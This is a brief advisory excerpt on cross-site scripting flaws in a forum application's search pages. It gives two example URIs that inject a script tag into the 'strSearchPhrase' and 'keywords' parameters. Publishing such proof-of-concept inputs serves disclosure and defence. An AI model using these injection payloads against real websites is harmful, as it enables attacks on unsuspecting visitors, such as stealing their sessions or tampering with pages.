Attackers can exploit these issues by enticing an unsuspecting to victim to follow a malicious URI.

The following example URIs are available:

http://www.example.com/forums/search.asp?strSearchPhrase="&gt;&lt;script&gt;alert(0);&lt;/script&gt;&amp;ContainerID=&amp;forumsearchoption=topics

http://www.example.com/search.asp?keywords="&gt;&lt;script&gt;alert(0);&lt;/script&gt;&amp;SearchType=And&amp;CurrentPage=1
